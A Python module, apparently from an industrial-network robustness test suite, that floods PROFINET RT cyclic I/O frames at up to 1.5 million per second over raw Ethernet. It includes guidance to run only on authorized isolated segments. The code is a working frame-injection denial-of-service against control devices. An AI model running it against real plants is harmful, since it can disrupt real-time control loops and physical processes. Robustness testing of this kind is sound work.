"""
測項：PROFINET RT (Real-Time Class 1) 週期性 I/O 訊框注入風暴
分類：PROFINET（Layer 2，EtherType 0x8892）
說明：PROFINET RT 是 IO-Controller 與 IO-Device 之間週期性交換製程資料（Process
Data）的即時通訊機制，使用保留的 EtherType 0x8892，並透過 FrameID 識別不同的資料
交換關係（依規範，單播 RT Class 1 資料的 FrameID 落在 0x8000-0xFBFF 範圍）。本測項
以高頻率灌入週期性 RT 資料框，模擬提高送出頻率或非預期端點注入 RT 交換的情境，
測試 IO-Device 對非預期/超量 RT 訊框的即時處理裕度、是否影響正常製程資料交換的
即時性。

與既有 profinet/dcp_flood.py 的差異：dcp_flood.py 測的是「探索/組態」用的 DCP
Multicast 廣播；本測項改測「已建立連線後持續運作」的 RT 週期性資料交換路徑，
屬於不同的協定層面與不同的失效模式（前者影響組態掃描，後者影響即時控制迴圈）。

重要限制：同其他 Layer2 測項，只能在受測、已授權的隔離網段執行；target 欄位僅供
記錄，實際發送對象由 dst_mac 決定。RT 訊框格式（FrameID + Process Data +
CycleCounter + DataStatus + TransferStatus）依 PROFINET 規範（IEC 61158）公開文件
手動組出，欄位配置未經真實 IO-Device 硬體逐位元驗證，如需嚴謹的協定一致性測試
建議搭配廠商官方工具比對。
需求：scapy、且需要 root 或 CAP_NET_RAW 權限。
"""
import struct
import time

from ..common import RateLimiter, clamp_duration

NAME = "PROFINET RT 週期性 I/O 訊框注入風暴"
CATEGORY = "PROFINET"
PROTOCOL = "L2"
TEST_TYPE = "traffic"  # 流量型：RT 週期性訊框注入洪水，靠封包速率本身造成負擔


def get_param_schema() -> dict:
    return {
        "iface": {"type": "string", "default": "eth0", "desc": "發送用網路介面"},
        "dst_mac": {"type": "string", "default": "ff:ff:ff:ff:ff:ff", "desc": "目的 MAC（建議填實際 IO-Device MAC，全FF廣播僅作示範）"},
        "frame_id": {"type": "int", "default": 32768, "min": 32768, "max": 64511, "desc": "RT FrameID（單播 RT Class 1 範圍 0x8000-0xFBFF）"},
        "data_len": {"type": "int", "default": 32, "min": 1, "max": 1440, "desc": "製程資料長度(bytes)"},
        "rate_pps": {"type": "int", "default": 1500000, "min": 1, "max": 1500000, "desc": "每秒送出訊框數"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    try:
        from scapy.all import Ether, Raw, sendp
    except ImportError:
        log_fn("[!] 未安裝 scapy，請先執行 pip install scapy")
        return {"frames_sent": 0, "error": "scapy not installed"}

    duration = clamp_duration(duration)
    iface = params.get("iface", "eth0")
    dst_mac = params.get("dst_mac", "ff:ff:ff:ff:ff:ff")
    frame_id = int(params.get("frame_id", 32768))
    data_len = int(params.get("data_len", 32))
    rate = int(params.get("rate_pps", 6000))

    process_data = b"\x00" * data_len
    data_status = 0x35  # 常見範例中代表「資料有效／主動來源」的狀態位元組合（依公開文件範例）

    limiter = RateLimiter(rate)
    sent = 0
    cycle_counter = 0
    start = time.time()

    log_fn(
        f"[+] PROFINET RT 週期資料注入 -> iface={iface}, dst={dst_mac}, "
        f"frame_id=0x{frame_id:04X}, {rate}pps, {duration}s"
    )
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        payload = (
            struct.pack(">H", frame_id)
            + process_data
            + struct.pack(">H", cycle_counter & 0xFFFF)
            + bytes([data_status])
            + b"\x00"  # TransferStatus，0 表示正常
        )
        cycle_counter += 1
        pkt = Ether(dst=dst_mac, type=0x8892) / Raw(load=payload)
        try:
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
        except (PermissionError, OSError, ValueError) as e:
            # ValueError：scapy 在 iface 參數指向不存在的網路介面時丟出的例外類型，
            # 一併攔截以確保介面名稱打錯字等常見情境也能輸出乾淨的錯誤訊息，
            # 而不是讓例外原始 traceback 冒出來。
            log_fn(f"[!] 發送失敗（權限、介面問題或介面名稱不存在）：{e}")
            break

    return {"frames_sent": sent, "elapsed_sec": round(time.time() - start, 1)}
